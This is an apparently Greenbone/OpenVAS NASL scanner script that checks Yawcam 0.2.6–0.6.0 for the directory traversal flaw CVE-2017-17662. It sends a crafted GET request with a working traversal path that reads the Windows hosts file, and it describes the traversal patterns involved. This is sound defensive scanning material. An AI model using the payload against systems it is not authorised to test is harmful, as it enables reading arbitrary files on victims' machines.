# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:yawcam:yawcam";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140684");
  script_version("2025-07-30T05:45:23+0000");
  script_tag(name:"last_modification", value:"2025-07-30 05:45:23 +0000 (Wed, 30 Jul 2025)");
  script_tag(name:"creation_date", value:"2018-01-15 14:43:14 +0700 (Mon, 15 Jan 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-02-02 18:32:00 +0000 (Fri, 02 Feb 2018)");

  script_cve_id("CVE-2017-17662");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Yawcam 0.2.6 - 0.6.0 Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_yawcam_http_detect.nasl");
  script_mandatory_keys("yawcam/http/detected");

  script_tag(name:"summary", value:"Yawcam is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Directory traversal in Yawcam allows attackers to read arbitrary
  files through a sequence of the form '.x./' or '....\x/' where x is a pattern composed of one or
  more (zero or more for the second pattern) of either \ or ..\ -- for example a '.\./', '....\/' or
  '...\./' sequence.");

  script_tag(name:"affected", value:"Yawcam version 0.2.6 through 0.6.0.");

  script_tag(name:"solution", value:"Update to version 0.6.1 or later.");

  script_xref(name:"URL", value:"https://packetstorm.news/files/id/145770");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/.\./.\./.\./.\./.\./.\./.\./windows/system32/drivers/etc/hosts.";

if (http_vuln_check(port: port, url: url, pattern: "This is a sample HOSTS file", check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
